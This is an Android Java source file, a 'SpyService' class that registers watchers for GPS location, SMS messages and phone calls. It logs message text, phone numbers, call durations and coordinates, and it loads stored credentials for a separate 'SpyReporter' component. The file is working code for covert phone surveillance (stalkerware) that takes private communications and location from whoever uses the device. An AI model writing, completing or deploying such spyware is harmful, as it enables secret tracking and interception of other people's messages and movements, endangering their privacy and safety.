package org.ddth.android.spy;

import org.ddth.android.monitor.AndroidRegisteringService;
import org.ddth.android.monitor.core.AndroidDC;
import org.ddth.android.monitor.observer.AndroidCallWatcher;
import org.ddth.android.monitor.observer.AndroidGpsWatcher;
import org.ddth.android.monitor.observer.AndroidSmsWatcher;
import org.ddth.http.core.Logger;
import org.ddth.mobile.monitor.core.DC;
import org.ddth.mobile.monitor.core.Report;
import org.ddth.mobile.monitor.core.Reporter;
import org.ddth.mobile.monitor.core.Watcher;
import org.ddth.mobile.monitor.report.Call;
import org.ddth.mobile.monitor.report.GPS;
import org.ddth.mobile.monitor.report.SMS;

import android.content.Context;
import android.content.SharedPreferences;

/**
 * @author khoanguyen
 */
public class SpyService extends AndroidRegisteringService {
	
	public void initialize(AndroidDC dc) {
		dc.getWatchdog().clear();
		Reporter reporter = new Reporter() {
			@Override
			public void report(DC dc, Report report) {
				String log = "Received: ";
				if (report instanceof SMS) {
					SMS sms = (SMS) report;
					log += sms.from + " -> " + sms.to + " : " + sms.message + " at [" + sms.date + "]";
				}
				else if (report instanceof Call) {
					Call call = (Call) report;
					log += call.from + " -> " + call.to + " : " + call.duration + " at [" + call.date + "]";
				}
				else if (report instanceof GPS) {
					GPS gps = (GPS) report;
					log += gps.lon + " & " + gps.lat + " : " + gps.speed + " at [" + gps.date + "]";
				}
				Logger.getDefault().debug(log);
			}
		};
		Watcher[] watchers = new Watcher[] {
			// I want to monitor GPS activities
			new AndroidGpsWatcher(reporter),
			// I want to monitor SMS activities
			new AndroidSmsWatcher(reporter),
			// I want to monitor Call activities
			new AndroidCallWatcher(reporter),
			// I want to bring up configuration dialog
			new SpyingConfiguratingWatcher()
		};
		// Start all of them for me...
		for (Watcher watcher : watchers) {
			watcher.start(dc);
		}
		
		// Yeah, I also want to read my configuration from local preferences
		SharedPreferences settings = dc.getContext().getSharedPreferences(
				SpyReporter.APPLICATION_TAG, Context.MODE_PRIVATE);
		SpyReporter.setCredentials(
				settings.getString(SpyReporter.USERNAME_FIELD, ""),
				settings.getString(SpyReporter.PASSWORD_FIELD, ""));

		Logger.getDefault().debug("Registered watchers successfully!");
	}
}
